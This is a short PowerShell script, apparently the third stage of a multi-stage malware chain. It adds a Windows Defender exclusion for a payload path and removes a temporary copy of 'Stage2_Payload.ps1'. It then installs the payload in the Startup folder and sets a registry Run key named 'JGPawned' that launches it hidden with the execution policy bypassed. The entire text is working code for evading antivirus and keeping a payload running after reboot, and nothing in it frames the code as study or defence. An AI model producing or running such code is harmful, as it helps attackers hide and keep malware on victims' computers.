# Stage 3: Cleanup and Persistence

# Add Windows Defender exclusion for the persistence path
$payloadPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Stage2_Payload.ps1"
Add-MpPreference -ExclusionPath $payloadPath

# Cleanup
Remove-Item "$env:TEMP\Stage2_Payload.ps1" -Force -ErrorAction SilentlyContinue

# Persistence (Registry Run Key Example)
$payloadPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Stage2_Payload.ps1"
Copy-Item "$env:TEMP\Stage2_Payload.ps1" $payloadPath -Force

# Add to registry for persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "JGPawned" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"" 